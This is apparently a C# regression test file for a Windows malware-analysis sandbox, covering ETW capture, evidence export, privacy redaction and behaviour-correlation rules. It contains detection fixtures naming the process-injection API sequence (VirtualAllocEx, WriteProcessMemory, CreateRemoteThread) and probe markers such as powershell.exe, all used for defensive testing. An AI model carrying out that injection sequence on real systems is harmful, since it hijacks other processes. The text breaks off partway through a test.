using MRTW.Collectors.Etw;
using MRTW.Core;
using Microsoft.Data.Sqlite;
using System.IO.Compression;
using System.Text;
using System.Text.Json;
using System.Diagnostics;

var tests = new List<(string Name, Action Body)>
{
    ("network modes normalize", TestNetworkModes),
    ("unsupported network mode fails", TestInvalidNetworkMode),
    ("shared orchestrator produces quality metadata", TestOrchestratorQuality),
    ("SQLite preserves UTC and quality", TestSqliteRoundTrip),
    ("JSON case export with UTF-8 BOM round trips", TestJsonBomRoundTrip),
    ("SQLite rejects oversized text before materialization", TestOversizedSqliteText),
    ("SQLite rejects oversized event text before materialization", TestOversizedEventText),
    ("behavior correlation remains deterministic", TestBehaviorCorrelation),
    ("enhanced static analysis emits structured PE metadata", TestEnhancedStaticAnalysis),
    ("static analysis probe markers are automatically asserted from DLL", TestStaticAnalysisProbeMarkers),
    ("schema v3 manifest and enhanced static metadata round trip", TestSchemaV3),
    ("invalid behavior rules fall back safely", TestInvalidRulesFallback),
    ("behavior rule text bounds fall back safely", TestRuleTextBounds),
    ("behavior rule order and exclusions are enforced", TestRuleConstraints),
    ("untrusted evidence paths are not exported", TestUntrustedEvidenceExport),
    ("tampered raw evidence is rejected", TestTamperedRawEvidence),
    ("privacy profile disables raw ETL path", TestPrivacyProfile),
    ("privacy export redacts every portable format", TestPortablePrivacyRedaction),
    ("synthetic persistence and configuration events round trip", TestSyntheticPersistenceConfigRoundTrip),
    ("evidence generations do not collide", TestEvidenceGenerationCollision),
    ("cancellation before launch never starts target", TestCancellationBeforeLaunch),
    ("snapshot cancellation is immediate and bounded", TestSnapshotCancellation),
    ("static analysis rejects oversized target", TestStaticAnalysisOversize),
    ("static analysis bounds long printable strings", TestStaticAnalysisLongString),
    ("live batch accumulator handles high volume without per-item snapshots", TestLiveBatchAccumulator)
    ,("bounded capture preserves first items and exports loss quality", TestBoundedCaptureQualityRoundTrip)
    ,("capture limits reject unsafe values", TestCaptureLimitValidation)
    ,("raw ETL path accepts only trusted case scratch", TestRawTracePathPolicy)
    ,("pre-launch ETW does not retain data before PID bind and stops idempotently", TestPrelaunchEtwSafety)
    ,("PID tree filter removes exited children and rejects PID reuse", TestPidTreeFilter)
    ,("runtime PID binding precedes the live Process Start callback", TestRuntimePidBindingOrder)
    ,("hook Process Start is eligible for pre-callback PID binding", TestHookPidBindingEligibility)
    ,("unbound pre-launch raw ETL is discarded", TestUnboundPrelaunchRawDiscard)
    ,("cancelled pre-launch raw ETL is discarded", TestCanceledPrelaunchRawDiscard)
    ,("pre-launch arm failure completes without raw evidence", TestPrelaunchArmFailure)
    ,("batch summary uses a stable partial-failure exit code", TestBatchSummary)
    ,("batch rejects command overrides before target execution", TestBatchCommandOverride)
    ,("persistence snapshot diffs and exports are normalized", TestPersistenceSnapshotDiffAndExport)
    ,("persistence surface timeout cancels an in-flight read", TestPersistenceSurfaceTimeout)
    ,("persistence surface entry limits retain a bounded result", TestPersistenceSurfaceLimit)
    ,("persistence timeout quality degrades the case", TestPersistenceTimeoutQuality)
    ,("WMI binding references normalize before matching", TestWmiBindingNormalization)
    ,("non-PE scripts produce bounded read-only triage", TestNonPeScriptTriage)
    ,("non-PE containers reject unsafe archive entries", TestNonPeZipSafety)
    ,("non-PE LNK and CFBF formats remain read-only", TestNonPeLnkAndCompoundTriage)
    ,("non-PE static output and privacy export preserve triage safely", TestNonPeStaticExport)
    ,("privacy export redacts every non-PE triage field", TestNonPeTriagePrivacyAcrossExports)
    ,("core execution boundary rejects a non-PE target disguised as exe", TestCoreRejectsNonPeExecution)
    ,("command mode cannot use a non-PE supplied target", TestCommandModeRejectsNonPeTarget)
    ,("PE header requires complete PE signature", TestMalformedPeIsNonPe)
    ,("UTF-16 LNK candidates are read without resolution", TestUtf16LnkTriage)
    ,("static privacy mode redacts non-PE outputs and HTML triage", TestStaticPrivacyNonPeOutputs)
    ,("CLI static privacy JSON log redacts non-PE findings", TestCliStaticPrivacyJsonLog)
    ,("GUI initial-access triage binds encoded-content markers", TestGuiEncodedMarkerBinding)
    ,("command normalization decodes bounded PowerShell text without execution", TestCommandNormalization)
    ,("command normalization rejects malformed oversized and binary input", TestCommandNormalizationBounds)
    ,("normalized commands export and privacy redaction round trip", TestNormalizedCommandExport)
    ,("normalized command SQLite load and behavior evidence round trip", TestNormalizedCommandLoadAndEvidence)
    ,("CSV values neutralize spreadsheet formulas", TestCsvFormulaNeutralization)
    ,("command normalization budget caps work without throwing", TestCommandNormalizationBudget)
    ,("behavior correlation shares command normalization budget across process groups", TestBehaviorCommandNormalizationBudget)
    ,("command normalization rejects malformed UTF text", TestCommandNormalizationMalformedUtf)
    ,("behavior evidence IDs follow final chronological event IDs", TestBehaviorEvidenceIdsAfterReindex)
    ,("command normalization degraded quality persists through JSON and SQLite", TestCommandNormalizationQualityRoundTrip)
};

int failures = 0;
foreach (var test in tests)
{
    try
    {
        test.Body();
        Console.WriteLine($"PASS {test.Name}");
    }
    catch (Exception ex)
    {
        failures++;
        Console.Error.WriteLine($"FAIL {test.Name}: {ex}");
    }
}
Console.WriteLine($"{tests.Count - failures}/{tests.Count} regression tests passed.");
return failures == 0 ? 0 : 1;

static void TestNetworkModes()
{
    Equal("observe", NetworkContainmentService.NormalizeMode("on"));
    Equal("block", NetworkContainmentService.NormalizeMode("off"));
    Equal("isolated", NetworkContainmentService.NormalizeMode("isolate"));
}

static void TestBatchSummary()
{
    var partial = new BatchAnalysisSummary(DateTimeOffset.UtcNow, 1, 1, 0,
    [
        new BatchAnalysisItem("ok.dll", "succeeded", 0, null, "case"),
        new BatchAnalysisItem("bad.exe", "failed", 3, "invalid", null)
    ]);
    Equal(10, partial.ExitCode);
    var success = partial with { Failed = 0 };
    Equal(0, success.ExitCode);
}

static void TestBatchCommandOverride()
{
    Throws<ArgumentException>(() => BatchAnalysisPolicy.RejectCommandOverride(true));
    BatchAnalysisPolicy.RejectCommandOverride(false);
}

static void TestPrelaunchEtwSafety()
{
    using var armed = new TraceEventEtwCollector().Arm(new EtwCollectorOptions(null, null, RawTracePath: null));
    try { armed.Ready.Wait(TimeSpan.FromSeconds(10)); } catch { /* unavailable ETW is an expected platform/permission outcome */ }
    armed.Stop();
    armed.Stop();
    EtwCollectionResult result = armed.Completion.GetAwaiter().GetResult();
    True(!result.TargetBound, "ETW capture reported a target bind that was never requested");
    True(result.Events.Count == 0 && result.NetworkSessions.Count == 0, "pre-bind ETW retained structured data");
}

static void TestPidTreeFilter()
{
    var filter = new PidTreeFilter(100);
    True(filter.TrackStart(100, 0, 100, true), "root process was not accepted");
    True(filter.TrackStart(100, 100, 101, true), "child process was not accepted");
    True(filter.Matches(100, 101), "tracked child event was rejected");
    filter.Complete(100, 101);
    True(!filter.Matches(100, 101), "exited child PID was retained and could accept PID reuse");
    True(!filter.TrackStart(100, 101, 102, true), "descendant of exited/reused PID was accepted");
    True(filter.Matches(100, 100), "root should remain tracked until capture ends");
}

static void TestRuntimePidBindingOrder()
{
    if (!OperatingSystem.IsWindows()) return;
    string command = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmd.exe");
    int bound = 0;
    bool startArrivedAfterBind = false;
    var profile = new ExecutionProfile(command, "exe", "none", null, "/d /c exit 0", Path.GetDirectoryName(command)!, 2,
        false, false, false, false, "observe");
    _ = new RuntimeCaseCollector().Collect(profile, null, CancellationToken.None,
        item =>
        {
            if (item.Action == "Process Start" && item.Pid > 0)
                startArrivedAfterBind = Volatile.Read(ref bound) == item.Pid;
        }, null, pid => Interlocked.CompareExchange(ref bound, pid, 0));
    True(bound > 0, "runtime did not publish the launched PID");
    True(startArrivedAfterBind, "live Process Start callback preceded PID binding");
}

static void TestHookPidBindingEligibility()
{
    var hookStart = new TimelineEvent(1, TimeSpan.Zero, "probe.exe", 4242, EventCategory.Process,
        "Process Start", "probe.exe", "simulated native hook pipe event", EventSeverity.Informational, "Hook", "{}");
    var hookAttached = hookStart with { Action = "Process Attached" };
    var order = new List<string>();
    RuntimeCaseCollector.DeliverForLiveCallback(hookStart, pid => order.Add($"bind:{pid}"), _ => order.Add("callback"));
    True(RuntimeCaseCollector.IsPidBindingEvent(hookAttached), "hook Process Attached was not recognized for PID bind");
    Equal("bind:4242", order[0]);
    Equal("callback", order[1]);
}

static void TestUnboundPrelaunchRawDiscard()
{
    string caseId = "case-" + Guid.NewGuid().ToString("N");
    string raw = Path.Combine(Path.GetTempPath(), "MRTW", caseId, "raw_evidence", "prebind.etl");
    try
    {
        using var armed = new TraceEventEtwCollector().Arm(new EtwCollectorOptions(null, null, RawTracePath: raw));
        try { armed.Ready.Wait(TimeSpan.FromSeconds(10)); } catch { /* ETW provider may be unavailable */ }
        armed.Stop();
        EtwCollectionResult result = armed.Completion.GetAwaiter().GetResult();
        True(result.RawTracePath is null, "unbound pre-launch ETL was returned as evidence");
        True(!File.Exists(raw), "unbound pre-launch ETL was not removed from trusted scratch");
        True(result.CaptureLimitReason.Contains("never bound", StringComparison.OrdinalIgnoreCase), "unbound raw discard was not recorded");
    }
    finally
    {
        string directory = Path.GetDirectoryName(Path.GetDirectoryName(raw)!)!;
        if (Directory.Exists(directory)) Directory.Delete(directory, true);
    }
}

static void TestCanceledPrelaunchRawDiscard()
{
    string caseId = "case-" + Guid.NewGuid().ToString("N");
    string raw = Path.Combine(Path.GetTempPath(), "MRTW", caseId, "raw_evidence", "cancelled.etl");
    try
    {
        using var canceled = new CancellationTokenSource();
        using var armed = new TraceEventEtwCollector().Arm(new EtwCollectorOptions(null, null, RawTracePath: raw), canceled.Token);
        canceled.Cancel();
        EtwCollectionResult result = armed.Completion.GetAwaiter().GetResult();
        True(result.RawTracePath is null && !File.Exists(raw), "cancelled unbound ETL was retained");
        True(result.CaptureLimitReason.Contains("never bound", StringComparison.OrdinalIgnoreCase), "cancelled raw discard was not recorded");
    }
    finally
    {
        string directory = Path.GetDirectoryName(Path.GetDirectoryName(raw)!)!;
        if (Directory.Exists(directory)) Directory.Delete(directory, true);
    }
}

static void TestPrelaunchArmFailure()
{
    string outside = Path.Combine(Path.GetTempPath(), "mrtw-untrusted-" + Guid.NewGuid().ToString("N") + ".etl");
    using var armed = new TraceEventEtwCollector().Arm(new EtwCollectorOptions(null, null, RawTracePath: outside));
    try { armed.Ready.Wait(TimeSpan.FromSeconds(2)); } catch { }
    EtwCollectionResult result = armed.Completion.GetAwaiter().GetResult();
    True(!result.Started && result.RawTracePath is null, "arm failure returned raw evidence");
    True(result.ErrorMessage?.Contains("failed", StringComparison.OrdinalIgnoreCase) == true, "arm failure was not surfaced through the result");
}

static void TestInvalidNetworkMode()
{
    Throws<ArgumentException>(() => NetworkContainmentService.NormalizeMode("pretend"));
}

static void TestCancellationBeforeLaunch()
{
    using var canceled = new CancellationTokenSource();
    canceled.Cancel();
    string target = Environment.ProcessPath ?? typeof(RuntimeCaseCollector).Assembly.Location;
    var profile = new ExecutionProfile(target, "exe", "none", null, $"\"{target}\"", Path.GetDirectoryName(target)!, null,
        false, false, false, false, "observe");
    var data = new RuntimeCaseCollector().Collect(profile, null, canceled.Token);
    True(data.Events.Any(e => e.Action == "Collection Canceled Before Launch"), "pre-launch cancellation was not recorded");
    True(!data.Events.Any(e => e.Action == "Process Start"), "target was launched after cancellation");
}

static void TestSnapshotCancellation()
{
    using var canceled = new CancellationTokenSource();
    canceled.Cancel();
    string target = Environment.ProcessPath ?? typeof(SnapshotService).Assembly.Location;
    var profile = new ExecutionProfile(target, "exe", "none", null, "", Path.GetDirectoryName(target)!, null, false, false, true, false, "observe");
    var result = new SnapshotService().Capture(profile, canceled.Token);
    True(result.Canceled, "canceled snapshot was reported as active");
    True(result.Data.Files.Count == 0, "canceled snapshot enumerated files");
}

static void TestStaticAnalysisOversize()
{
    string path = Path.Combine(Path.GetTempPath(), "mrtw-large-" + Guid.NewGuid().ToString("N") + ".bin");
    try
    {
        using (var stream = new FileStream(path, FileMode.CreateNew, FileAccess.Write)) stream.SetLength(StaticAnalysisService.MaximumInputBytes + 1);
        Throws<InvalidDataException>(() => new StaticAnalysisService().Analyze(path));
    }
    finally { if (File.Exists(path)) File.Delete(path); }
}

static void TestStaticAnalysisLongString()
{
    string path = Path.Combine(Path.GetTempPath(), "mrtw-strings-" + Guid.NewGuid().ToString("N") + ".bin");
    try
    {
        File.WriteAllBytes(path, System.Text.Encoding.ASCII.GetBytes("https://example.com/" + new string('A', 128 * 1024) + "\0"));
        var result = new StaticAnalysisService().Analyze(path);
        True(result.SuspiciousStrings.Count > 0, "long printable indicator was not extracted");
        True(result.SuspiciousStrings.All(s => s.Length <= 4_096), "long printable run was retained without a bound");
    }
    finally { if (File.Exists(path)) File.Delete(path); }
}

static void TestLiveBatchAccumulator()
{
    var buffer = new LiveBatchAccumulator<int>();
    buffer.AddRange(Enumerable.Range(0, 10_000));
    True(buffer.MaterializationCount == 0, "live buffer materialized during individual adds");
    var first = buffer.Snapshot();
    buffer.AddRange(Enumerable.Range(10_000, 2_000));
    var second = buffer.Snapshot();
    Equal(2, buffer.MaterializationCount);
    Equal(10_000, first.Length);
    Equal(12_000, second.Length);
    Equal(0, second[0]);
    Equal(11_999, second[^1]);
    var ordered = new LiveBatchAccumulator<int>();
    for (int tick = 0; tick < 100; tick++) ordered.AddOrderedRange([tick * 2 + 1, tick * 2], Comparer<int>.Default);
    True(ordered.Items.SequenceEqual(Enumerable.Range(0, 200)), "out-of-order batches were not stably merged");
    True(ordered.MaterializationCount == 0, "cadence ticks materialized history");
    Equal(50, ordered.TrimToMaximum(150));
    Equal(150, ordered.Count);
    Equal(50, ordered.Items[0]);
    var removed = ordered.RemoveOldestToMaximum(100);
    Equal(50, removed.Count);
    Equal(100, ordered.Count);
    var capped = new LiveBatchAccumulator<int>();
    capped.AddOrderedRange(Enumerable.Range(1, 10_000), Comparer<int>.Default);
    capped.AddOrderedRange([0], Comparer<int>.Default);
    var trimmedLate = capped.RemoveOldestToMaximum(10_000);
    Equal(1, trimmedLate.Count);
    Equal(0, trimmedLate[0]);
    True(!capped.Items.Contains(0) && capped.Count == 10_000, "late oldest event remained after live history cap");
}

static void TestOrchestratorQuality()
{
    string sample = Environment.ProcessPath ?? typeof(AnalysisOrchestrator).Assembly.Location;
    var profile = new ExecutionProfile(sample, "exe", "none", null, $"\"{sample}\"",
        Path.GetDirectoryName(sample)!, 1, true, false, false, false, "observe", ExecuteTarget: false);
    CaseData data = new AnalysisOrchestrator().Collect(profile, null);
    True(data.Quality is not null, "quality missing");
    Equal("skipped", data.Quality!.Collectors.Single(c => c.Collector == "ETW").Status);
    True(data.Events.All(e => e.CapturedAtUtc.HasValue), "UTC capture time missing");
}

static void TestSqliteRoundTrip()
{
    string root = Path.Combine(Path.GetTempPath(), "mrtw-regression-" + Guid.NewGuid().ToString("N"));
    try
    {
        Directory.CreateDirectory(root);
        DateTimeOffset now = DateTimeOffset.UtcNow;
        var quality = new CaseQuality("healthy",
            [new CollectorHealth("Runtime", "healthy", now, now, 1, 0)], "observe", true);
        var item = new TimelineEvent(1, TimeSpan.Zero, "test.exe", 42, EventCategory.Process,
            "Process Start", "test.exe", "test", EventSeverity.Low, "Regression", "{}", CapturedAtUtc: now);
        var data = new CaseData("case-test", "case-test", "test.exe", "test.exe", "hash", now,
            TimeSpan.Zero, null, [], [item], [], [], "notes", quality);
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("sqlite", Compress: false));
        CaseData loaded = new CaseService().Load(Path.Combine(root, "case.sqlite"));
        Equal(now.ToString("O"), loaded.Events.Single().CapturedAtUtc!.Value.ToString("O"));
        Equal("healthy", loaded.Quality!.OverallStatus);
    }
    finally
    {
        if (Directory.Exists(root))
        {
            Directory.Delete(root, true);
        }
    }
}

static void TestJsonBomRoundTrip()
{
    string root = Path.Combine(Path.GetTempPath(), "mrtw-json-bom-" + Guid.NewGuid().ToString("N"));
    try
    {
        var data = new CaseData("json-bom", "json-bom", "sample.exe", "sample.exe", "hash", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], [], [], [], "");
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("json", Compress: false));
        byte[] bytes = File.ReadAllBytes(Path.Combine(root, "case.json"));
        True(bytes.Length >= 3 && bytes[0] == 0xEF && bytes[1] == 0xBB && bytes[2] == 0xBF, "test fixture did not contain UTF-8 BOM");
        Equal("json-bom", new CaseService().Load(Path.Combine(root, "case.json")).CaseId);
    }
    finally { SqliteConnection.ClearAllPools(); if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestBoundedCaptureQualityRoundTrip()
{
    var buffer = new BoundedCaptureBuffer<int>(2);
    var networkBuffer = new BoundedCaptureBuffer<string>(2);
    True(buffer.TryAdd(10), "first item was not retained");
    True(buffer.TryAdd(20), "second item was not retained");
    True(!buffer.TryAdd(30), "overflow item was retained");
    Equal(3L, buffer.Received);
    Equal(1L, buffer.Dropped);
    Equal(10, buffer.ToArray()[0]);
    Equal(20, buffer.ToArray()[1]);
    True(networkBuffer.TryAdd("network-first"), "network capture did not remain independent of event capture");
    True(networkBuffer.TryAdd("network-second"), "network capture stopped when event capture overflowed");
    True(!networkBuffer.TryAdd("network-third"), "network overflow item was retained");
    Equal(2L, networkBuffer.ToArray().LongLength);
    Equal(1L, networkBuffer.Dropped);

    string root = Path.Combine(Path.GetTempPath(), "mrtw-bounded-quality-" + Guid.NewGuid().ToString("N"));
    try
    {
        DateTimeOffset now = DateTimeOffset.UtcNow;
        var health = new CollectorHealth("Runtime", "degraded", now, now, buffer.Received, buffer.Dropped,
            "event_limit=2;event_received=3;event_dropped=1; persisted runtime capture reached its first-in limit; later items were discarded while monitoring continued.");
        var networkHealth = new CollectorHealth("ETWNetwork", "degraded", now, now, networkBuffer.Received, networkBuffer.Dropped,
            "network_limit=2;network_received=3;network_dropped=1;");
        var data = new CaseData("bounded", "bounded", "sample.exe", "sample.exe", "hash", now, TimeSpan.Zero, null, [],
            [new TimelineEvent(1, TimeSpan.Zero, "sample.exe", 1, EventCategory.Process, "Process Start", "first", "first retained", EventSeverity.Low, "Runtime", "{}", CapturedAtUtc: now),
             new TimelineEvent(2, TimeSpan.FromSeconds(1), "sample.exe", 1, EventCategory.Process, "Process Exit", "second", "second retained", EventSeverity.Low, "Runtime", "{}", CapturedAtUtc: now.AddSeconds(1))],
            [], [], "bounded test", new CaseQuality("degraded", [health, networkHealth], "observe", true));
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("html,json,sqlite", Compress: false));
        CaseData json = new CaseService().Load(Path.Combine(root, "case.json"));
        CaseData sqlite = new CaseService().Load(Path.Combine(root, "case.sqlite"));
        Equal(1L, json.Quality!.Collectors.Single(c => c.Collector == "Runtime").EventsDropped);
        Equal(3L, sqlite.Quality!.Collectors.Single(c => c.Collector == "Runtime").EventsReceived);
        Equal(1L, sqlite.Quality.Collectors.Single(c => c.Collector == "ETWNetwork").EventsDropped);
        string html = File.ReadAllText(Path.Combine(root, "report.html"));
        True(html.Contains("event_dropped=1", StringComparison.Ordinal), "HTML omitted bounded capture reason");
        True(html.Contains("network_dropped=1", StringComparison.Ordinal), "HTML omitted bounded ETW network reason");
    }
    finally { if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestCaptureLimitValidation()
{
    CaptureLimits.Validate(CaptureLimits.DefaultEvents, CaptureLimits.DefaultNetworkSessions, CaptureLimits.DefaultRawTraceBytes);
    CaptureLimits.Validate(1, 1, CaptureLimits.MinimumRawTraceBytes);
    CaptureLimits.Validate(CaptureLimits.MaximumEvents, CaptureLimits.MaximumNetworkSessions, CaptureLimits.MaximumRawTraceBytes);
    Throws<ArgumentOutOfRangeException>(() => CaptureLimits.ValidatePersisted(0, 1));
    Throws<ArgumentOutOfRangeException>(() => CaptureLimits.ValidatePersisted(CaptureLimits.MaximumEvents + 1, 1));
    Throws<ArgumentOutOfRangeException>(() => CaptureLimits.ValidatePersisted(1, 0));
    Throws<ArgumentOutOfRangeException>(() => CaptureLimits.Validate(1, 1, CaptureLimits.MinimumRawTraceBytes - 1));
    Throws<ArgumentOutOfRangeException>(() => new TraceEventEtwCollector().Collect(new EtwCollectorOptions(null, null, MaxRawTraceBytes: CaptureLimits.MaximumRawTraceBytes + 1)));
}

static void TestRawTracePathPolicy()
{
    string caseId = "case-regression-" + Guid.NewGuid().ToString("N");
    string root = Path.Combine(Path.GetTempPath(), "MRTW", caseId);
    try
    {
        string trusted = Path.Combine(root, "raw_evidence", "network-process.etl");
        Equal(Path.GetFullPath(trusted), TraceEventEtwCollector.ValidateRawTracePath(trusted));
        Throws<InvalidOperationException>(() => TraceEventEtwCollector.ValidateRawTracePath(Path.Combine(Path.GetTempPath(), "outside.etl")));
        Throws<InvalidOperationException>(() => TraceEventEtwCollector.ValidateRawTracePath(Path.Combine(root, "case-extra", "raw_evidence", "..", "escaped.etl")));
        Throws<InvalidOperationException>(() => new TraceEventEtwCollector().Collect(new EtwCollectorOptions(null, null, RawTracePath: Path.Combine(Path.GetTempPath(), "outside.etl"))));
        TestRawTraceReparseRejection();
    }
    finally { if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestRawTraceReparseRejection()
{
    string caseDirectory = Path.Combine(Path.GetTempPath(), "MRTW", "case-link-" + Guid.NewGuid().ToString("N"));
    string rawDirectory = Path.Combine(caseDirectory, "raw_evidence");
    string outside = Path.Combine(Path.GetTempPath(), "mrtw-raw-link-target-" + Guid.NewGuid().ToString("N"));
    Directory.CreateDirectory(caseDirectory);
    Directory.CreateDirectory(outside);
    try
    {
        try
        {
            Directory.CreateSymbolicLink(rawDirectory, outside);
            Throws<InvalidOperationException>(() => TraceEventEtwCollector.ValidateRawTracePath(Path.Combine(rawDirectory, "linked.etl")));
        }
        catch (UnauthorizedAccessException) { Console.WriteLine("SKIP raw ETL parent reparse test: symbolic-link creation is unavailable."); }
        catch (IOException) { Console.WriteLine("SKIP raw ETL parent reparse test: symbolic-link creation is unavailable."); }

        if (Directory.Exists(rawDirectory) && (File.GetAttributes(rawDirectory) & FileAttributes.ReparsePoint) != 0)
            Directory.Delete(rawDirectory);
        Directory.CreateDirectory(rawDirectory);
        string linkedFile = Path.Combine(rawDirectory, "linked-file.etl");
        string outsideFile = Path.Combine(outside, "outside.etl");
        File.WriteAllText(outsideFile, "safe regression fixture");
        try
        {
            File.CreateSymbolicLink(linkedFile, outsideFile);
            Throws<InvalidOperationException>(() => TraceEventEtwCollector.ValidateRawTracePath(linkedFile));
        }
        catch (UnauthorizedAccessException) { Console.WriteLine("SKIP raw ETL file reparse test: symbolic-link creation is unavailable."); }
        catch (IOException) { Console.WriteLine("SKIP raw ETL file reparse test: symbolic-link creation is unavailable."); }
    }
    finally
    {
        try { if (Directory.Exists(outside)) Directory.Delete(outside, true); } catch { }
        try { if (Directory.Exists(caseDirectory)) Directory.Delete(caseDirectory, true); } catch { }
    }
}

static void TestBehaviorCorrelation()
{
    var events = new[]
    {
        E(1, "VirtualAllocEx"), E(2, "WriteProcessMemory"), E(3, "CreateRemoteThread")
    };
    var correlated = BehaviorCorrelator.Correlate(events);
    Equal(1, correlated.Count(e => e.Action == "Process Injection Detected"));
    Equal(correlated.Count, correlated.Select(e => e.Id).Distinct().Count());
}

static void TestOversizedSqliteText()
{
    string root = Path.Combine(Path.GetTempPath(), "mrtw-sqlite-limit-" + Guid.NewGuid().ToString("N"));
    try
    {
        Directory.CreateDirectory(root);
        var data = new CaseData("limit", "limit", "x", "x", "", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], [], [], [], "");
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("sqlite", Compress: false));
        using (var connection = new SqliteConnection($"Data Source={Path.Combine(root, "case.sqlite")};Pooling=False"))
        {
            connection.Open();
            using var command = connection.CreateCommand();
            command.CommandText = "INSERT INTO static_analysis(json) VALUES($json)";
            command.Parameters.AddWithValue("$json", new string('x', 16 * 1024 * 1024 + 1));
            command.ExecuteNonQuery();
        }

        var loaded = new CaseService().Load(Path.Combine(root, "case.sqlite"));
        True(loaded.StaticAnalysis is null, "oversized static JSON was accepted");
    }
    finally { if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestOversizedEventText()
{
    string root = Path.Combine(Path.GetTempPath(), "mrtw-event-limit-" + Guid.NewGuid().ToString("N"));
    try
    {
        Directory.CreateDirectory(root);
        var eventItem = new TimelineEvent(1, TimeSpan.Zero, "x", 1, EventCategory.Api, "A", "", "", EventSeverity.Low, "", "{}", CapturedAtUtc: DateTimeOffset.UtcNow);
        var data = new CaseData("event-limit", "event-limit", "x", "x", "", DateTimeOffset.UtcNow, TimeSpan.Zero, null, [], [eventItem], [], [], "");
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("sqlite", Compress: false));
        using (var connection = new SqliteConnection($"Data Source={Path.Combine(root, "case.sqlite")};Pooling=False"))
        {
            connection.Open();
            using var command = connection.CreateCommand();
            command.CommandText = "UPDATE events SET captured_at_utc=$value";
            command.Parameters.AddWithValue("$value", new string('x', 64 * 1024 + 1));
            command.ExecuteNonQuery();
        }

        Throws<InvalidDataException>(() => new CaseService().Load(Path.Combine(root, "case.sqlite")));
    }
    finally { if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestEnhancedStaticAnalysis()
{
    string target = typeof(StaticAnalysisService).Assembly.Location;
    var result = new StaticAnalysisService().Analyze(target);
    True(result.IsDotNet, ".NET image was not detected");
    True(result.Sections.Count > 0, "PE sections missing");
    True(result.DotNetMetadata?.Count > 0, ".NET metadata summary missing");
    True(result.Imports.Any(i => i.Contains('!')), "structured imports missing");
    True(result.VersionInfo is not null, "version information missing");
}

static void TestStaticAnalysisProbeMarkers()
{
    string target = Path.Combine(FindRepositoryRoot(), "test", "StaticAnalysisProbe", "bin", "Release", "net9.0", "StaticAnalysisProbe.dll");
    True(File.Exists(target), "StaticAnalysisProbe DLL was not built");
    var result = new StaticAnalysisService().Analyze(target);
    True(result.IsDotNet, "probe DLL was not identified as .NET");
    True(result.SuspiciousStrings.Any(s => s.Contains("analysis-probe.example.test", StringComparison.OrdinalIgnoreCase)), "probe domain marker missing");
    True(result.SuspiciousStrings.Any(s => s.Contains("StaticAnalysisProbe", StringComparison.OrdinalIgnoreCase)), "probe registry/path marker missing");
    True(result.SuspiciousStrings.Any(s => s.Contains("powershell.exe", StringComparison.OrdinalIgnoreCase)), "probe command marker missing");
}

static void TestSchemaV3()
{
    string root = Path.Combine(Path.GetTempPath(), "mrtw-schema3-" + Guid.NewGuid().ToString("N"));
    try
    {
        var analysis = new StaticAnalysisService().Analyze(typeof(StaticAnalysisService).Assembly.Location);
        string trustedRoot = Path.Combine(Path.GetTempPath(), "MRTW", "v3");
        string raw = Path.Combine(trustedRoot, "raw_evidence", "source.etl");
        Directory.CreateDirectory(Path.GetDirectoryName(raw)!);
        File.WriteAllBytes(raw, [1, 2, 3]);
        var network = new NetworkSession("sample", "example.test", "192.0.2.1", "192.0.2.1", 53, "DNS", TimeSpan.Zero, 0, 0, "", "", "0", "192.0.2.1", "DNS client ETW metadata");
        string rawHash = Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(File.ReadAllBytes(raw))).ToLowerInvariant();
        var data = new CaseData("v3", "v3", analysis.FileName, analysis.FullPath, analysis.Sha256, DateTimeOffset.UtcNow, TimeSpan.Zero, analysis, [], [], [], [network], "", RawEvidenceFiles: [raw]) { TrustedEvidenceRoot = trustedRoot, RawEvidence = [new(raw, 3, rawHash, "test")] };
        new CaseExportService().WriteCaseBundle(data, root, new ExportOptions("json,sqlite", Compress: false));
        True(File.Exists(Path.Combine(root, "raw_evidence", "source.etl")), "trusted raw evidence was not copied");
        string manifest = File.ReadAllText(Path.Combine(root, "manifest.json"));
        True(manifest.Contains("\"schema_version\": 3"), "schema v3 manifest missing");
        var loaded = new CaseService().Load(Path.Combine(root, "case.sqlite"));
        Equal(analysis.Imphash, loaded.StaticAnalysis!.Imphash);
        Equal("DNS client ETW metadata", loaded.NetworkSessions.Single().Coverage);
        Equal(Path.Combine("raw_evidence", "source.etl"), loaded.RawEvidenceFiles!.Single());
    }
    finally { if (Directory.Exists(root)) Directory.Delete(root, true); }
}

static void TestInvalidRulesFallback()
{
    string file = Path.GetTempFileName();
    try
    {
        File.WriteAllText(file, "[{}]"); Environment.SetEnvironmentVariable("MRTW_BEHAVIOR_RULES", file);
        var correlated = BehaviorCorrelator.Correlate([E(1, "VirtualAllocEx"), E(2, "WriteProcessMemory"), E(3, "CreateRemoteThread")]);
        True(correlated.Any(e => e.Action == "Remote Thread Injection"), "invalid rules did not use fallback");
    }
    finally { Environment.SetEnvironmentVariable("MRTW_BEHAVIOR_RULES", null); File.Delete(file); }
}

static void TestRuleTextBounds()
{
    string file = Path.GetTempFileName();
    try
    {
        string tactic = new('t', 161);
        File.WriteAllText(file, $$"""[{"action":"too-long-tactic","summary":"test","severity":"High","technique_id":"T0001","technique_name":"Test","confidence":"High","actions":["VirtualAllocEx","WriteProcessMemory","CreateRemoteThread"],"version":"1","tactic":"{{tactic}}"}]""");
        Environment.SetEnvironmentVariable("MRTW_BEHAVIOR_RULES", file);
        var correlated = BehaviorCorrelator.Correlate([E(1, "VirtualAllocEx"), E(2, "WriteProcessMemory"), E(3, "CreateRemoteThread")]);
        True(correlated.Any(e => e.Action == "Remote Thread Injection"), "oversized emitted rule field did not fall back");
    }
    finally { Environment.SetEnvironmentVariable("MRTW_BEHAVIOR_RULES", null); File.Delete(file); }
}

static void TestRuleConstraints()
{
    string file = Path.GetTempFileName();
    try
    {
        File.WriteAllText(file, """[{"action":"ordered","summary":"test","severity":"High","technique_id":"T0001","technique_name":"Test","confidence":"High","actions":["A","B"],"version":"1","tactic":"Test","require_order":true,"exclude_actions":["BLOCK"]}]""");
